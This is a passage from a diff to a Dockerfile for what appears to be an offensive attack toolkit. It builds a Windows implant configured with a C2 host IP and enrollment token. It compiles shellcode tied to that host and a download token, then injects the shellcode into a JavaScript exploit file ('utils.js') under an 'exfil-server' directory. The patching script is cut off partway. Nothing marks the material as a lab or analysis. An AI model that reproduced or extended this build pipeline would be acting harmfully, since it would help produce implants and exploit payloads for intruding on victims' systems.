@@ -36,11 +36,13 @@ FROM debian:bookworm-slim AS builder
 
 ARG C2_HOST_IP
 ARG ENROLLMENT_TOKEN
+ARG DOWNLOAD_TOKEN
 
 RUN apt-get update && apt-get install -y --no-install-recommends \
         build-essential \
         make \
         mingw-w64 \
+        nasm \
         python3 \
     && rm -rf /var/lib/apt/lists/*
 
@@ -63,18 +65,19 @@ RUN make bin/windows/implant.exe \
         ENROLLMENT_TOKEN="${ENROLLMENT_TOKEN}" \
         OPENSSL_WIN_PREFIX=/opt/openssl-win
 
+# ── Build shellcode ───
+WORKDIR /opt/shellcode-gen
+COPY exfil-server/shellcode-generation/ ./
+RUN make clean && make HOST_IP="${C2_HOST_IP}" DOWNLOAD_TOKEN="${DOWNLOAD_TOKEN}"
+
 # Patch shellcode and utils.js
 WORKDIR /opt/exploit/exploit-contents
 COPY exfil-server/exploit-contents/ ./
 
-WORKDIR /opt/shellcode-gen
-COPY exfil-server/shellcode-generation/ ./
-RUN cp /opt/shellcode-gen/bin/final_shellcode.bin /tmp/shellcode.bin
-
 # Patch shellcode uint32 array into utils.js
 RUN python3 - <<'EOF'
 import struct, re
-data = open('/tmp/shellcode.bin', 'rb').read()
+data = open('/opt/shellcode-gen/bin/final_shellcode.bin', 'rb').read()
 r = len(data) % 4
 if r: data += b'\x00' * (4 - r)
 ints = struct.unpack('<' + 'I' * (len(data)//4), data)
